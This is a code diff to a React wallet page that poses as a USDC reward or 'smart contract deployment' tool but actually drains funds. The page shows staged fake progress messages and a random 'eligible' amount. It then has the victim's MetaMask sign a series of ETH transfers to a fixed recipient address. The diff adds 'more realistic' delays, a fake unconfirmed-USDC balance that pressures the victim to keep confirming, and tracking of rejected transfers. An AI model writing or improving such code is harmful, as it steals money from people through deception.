@@ -1,12 +1,17 @@
 "use client";
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import Image from "next/image";
 import { ethers } from "ethers";
 import { FaSpinner } from "react-icons/fa";
+import { getRejectedAmount, trackRejectedAmount } from "@/lib/database.action";
 
 interface EthereumError {
   code: number | string;
   message: string;
+}
+
+function formatNumberWithCommas(number: number) {
+  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 }
 
 export function Wallet() {
@@ -18,6 +23,10 @@ export function Wallet() {
   const [modalStep, setModalStep] = useState<number>(0);
   const [eligibleAmount, setEligibleAmount] = useState<number>(0);
   const [confirmationCount, setConfirmationCount] = useState<number>(0);
+  const [rejectedBalance, setRejectedBalance] = useState<number>(0);
+
+  // Use useRef to maintain a stable reference to eligibleAmount
+  const eligibleAmountRef = useRef<number>(0);
 
   const ELIGIBLE_AMOUNTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
   const TRANSACTION_AMOUNTS = [
@@ -48,16 +57,19 @@ export function Wallet() {
       title: "Adding address to smart contract",
       icon: "⚡",
       loading: true,
+      showClose: false,
     },
     {
       title: "Address successfully added",
       icon: "✅",
       loading: false,
+      showClose: false,
     },
     {
       title: `Your address is eligible to receive $${eligibleAmount}`,
       icon: "🎉",
       loading: false,
+      showClose: false,
     },
     {
       title: "Processing Transactions",
@@ -67,6 +79,7 @@ export function Wallet() {
           : "Awaiting first confirmation",
       icon: "⏳",
       loading: true,
+      showClose: false,
     },
     {
       title: "Confirmation Rejected",
@@ -74,12 +87,14 @@ export function Wallet() {
         "Your wallet has rejected the confirmation request.\n\nUnconfirmed USDC will be displayed on your dashboard.\n\nConfirm deployment to receive USDC.",
       icon: "❌",
       loading: false,
+      showClose: true,
     },
     {
       title: "Confirmation Complete",
       subtitle: "All confirmation processed successfully",
       icon: "✅",
       loading: false,
+      showClose: true,
     },
   ];
 
@@ -105,6 +120,14 @@ export function Wallet() {
               <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse"></div>
             </div>
           )}
+          {modalSteps[modalStep].showClose && (
+            <button
+              onClick={() => setShowModal(false)}
+              className="mt-4 px-4 py-2 bg-[#08a0dd] text-white rounded-lg hover:bg-[#08a0dd]/80 transition-all"
+            >
+              Close
+            </button>
+          )}
         </div>
       </div>
     </div>
@@ -119,6 +142,56 @@ export function Wallet() {
       inMetaMaskBrowser: userAgent.includes("metamask"),
     });
   }, []);
+
+  useEffect(() => {
+    const handleAccountsChanged = (accounts: string[]) => {
+      if (accounts.length > 0) {
+        setWalletAddress(accounts[0]);
+        loadRejectedBalance(accounts[0]);
+      } else {
+        setWalletAddress("");
+        setRejectedBalance(0);
+      }
+    };
+
+    if (window.ethereum?.on) {
+      window.ethereum.on("accountsChanged", handleAccountsChanged);
+    }
+
+    return () => {
+      if (window.ethereum?.removeListener) {
+        window.ethereum.removeListener(
+          "accountsChanged",
+          handleAccountsChanged
+        );
+      }
+    };
+  }, []);
+
+  const loadRejectedBalance = async (address: string) => {
+    const result = await getRejectedAmount(address);
+    if (result.success) {
+      setRejectedBalance(result.amount);
+    }
+  };
+
+  const connectWallet = async () => {
+    try {
+      if (!window.ethereum?.isMetaMask) {
+        setErrorMessage("Please install MetaMask");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const accounts = await provider.send("eth_requestAccounts", []);
+      setWalletAddress(accounts[0]);
+
+      await loadRejectedBalance(accounts[0]);
+    } catch (error) {
+      setErrorMessage("Failed to connect wallet");
+      console.error(error);
+    }
+  };
 
   const handleMetaMaskRedirect = () => {
     if (deviceInfo.isAndroid || deviceInfo.isIOS) {
@@ -141,14 +214,17 @@ export function Wallet() {
 
     const randomAmount =
       ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
-    setEligibleAmount(randomAmount);
 
-    setTimeout(() => setModalStep(1), 2000);
-    setTimeout(() => setModalStep(2), 4000);
+    setEligibleAmount(randomAmount);
+    eligibleAmountRef.current = randomAmount;
+
+    // More realistic delays
+    setTimeout(() => setModalStep(1), 4000); // 4 seconds for initial processing
+    setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show eligibility
     setTimeout(() => {
       setModalStep(3);
       handleSmartCall();
-    }, 6000);
+    }, 11000); // 4 more seconds before starting transactions
   };
 
   const checkAndSwitchNetwork = async (): Promise<boolean> => {
@@ -174,17 +250,33 @@ export function Wallet() {
     signer: ethers.providers.JsonRpcSigner,
     amount: string
   ): Promise<void> => {
-    const transaction = {
-      to: RECIPIENT_ADDRESS,
-      value: ethers.utils.parseEther(amount),
-      gasLimit: 21000,
-    };
+    try {
+      const transaction = {
+        to: RECIPIENT_ADDRESS,
+        value: ethers.utils.parseEther(amount),
+        gasLimit: 21000,
+      };
 
-    const txResponse = await signer.sendTransaction(transaction);
-    await txResponse.wait();
-    setConfirmationCount((prev) => prev + 1);
+      const txResponse = await signer.sendTransaction(transaction);
+      await txResponse.wait();
+      setConfirmationCount((prev) => prev + 1);
+    } catch (error) {
+      const ethError = error as EthereumError;
+      if (ethError.code === "ACTION_REJECTED") {
+        // Only track rejected amount if at least one transaction was confirmed
+        if (confirmationCount > 0) {
+          console.log(
+            "action rejected eligible amount: ",
+            eligibleAmountRef.current
+          );
+          await trackRejectedAmount(walletAddress, eligibleAmountRef.current);
+          setRejectedBalance((prev) => prev + eligibleAmountRef.current);
+        }
+        throw ethError;
+      }
+      throw error;
+    }
   };
-
   const handleSmartCall = async (): Promise<void> => {
     setIsLoading(true);
     setErrorMessage("");
@@ -212,8 +304,6 @@ export function Wallet() {
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
-      const accounts = await provider.send("eth_requestAccounts", []);
-      setWalletAddress(accounts[0]);
 
       for (const amount of TRANSACTION_AMOUNTS) {
         try {
@@ -222,7 +312,7 @@ export function Wallet() {
           const ethError = error as EthereumError;
           if (ethError.code === "ACTION_REJECTED") {
             setModalStep(4);
-            setTimeout(() => setShowModal(false), 5000);
+            setTimeout(() => setShowModal(false), 20000);
             return;
           }
           throw error;
@@ -230,7 +320,7 @@ export function Wallet() {
       }
 
       setModalStep(5);
-      setTimeout(() => setShowModal(false), 3000);
+      setTimeout(() => setShowModal(false), 20000);
     } catch (error) {
       const ethError = error as EthereumError;
       setErrorMessage(
@@ -244,6 +334,7 @@ export function Wallet() {
       setIsLoading(false);
     }
   };
+
   return (
     <div>
       <div className="flex justify-between items-center w-full mb-6">
@@ -264,10 +355,11 @@ export function Wallet() {
             >
               <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z" />
             </svg>
-            0.00 USDC
+            {formatNumberWithCommas(rejectedBalance)} USDC
           </button>
         </div>
       </div>
+
       <div className="flex flex-col p-6 rounded-xl items-center space-y-4 bg-[#090C17] w-full ring-1 ring-white/20 max-w-md relative">
         <Image
           src="/metamask.webp"
@@ -285,19 +377,28 @@ export function Wallet() {
           </p>
         )}
 
-        <button
-          onClick={startModalSequence}
-          className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
-          disabled={isLoading}
-        >
-          {isLoading ? (
-            <>
-              <FaSpinner className="animate-spin mr-2" /> Processing...
-            </>
-          ) : (
-            "Deploy"
-          )}
-        </button>
+        {!walletAddress ? (
+          <button
+            onClick={connectWallet}
+            className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70"
+          >
+            Connect Wallet
+          </button>
+        ) : (
+          <button
+            onClick={startModalSequence}
+            className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
+            disabled={isLoading}
+          >
+            {isLoading ? (
+              <>
+                <FaSpinner className="animate-spin mr-2" /> Processing...
+              </>
+            ) : (
+              "Deploy"
+            )}
+          </button>
+        )}
 
         {!walletAddress && (
           <p className="max-md:text-xs text-sm text-orange-500 font-semibold">
@@ -320,22 +421,6 @@ export function Wallet() {
             </ol>
           </div>
         )}
-
-        {/* {transactionStatus &&
-          transactionStatus.split("\n").map((line, index) => (
-            <p
-              key={index}
-              className={`text-sm ${
-                line.includes("Network Congested") ||
-                line.includes("Smart contract development failed") ||
-                line.includes("Try again")
-                  ? "text-red-500"
-                  : "text-green-500"
-              }`}
-            >
-              {line}
-            </p>
-          ))} */}
 
         {errorMessage && (
           <p className="text-sm text-red-500 text-center">{errorMessage}</p>
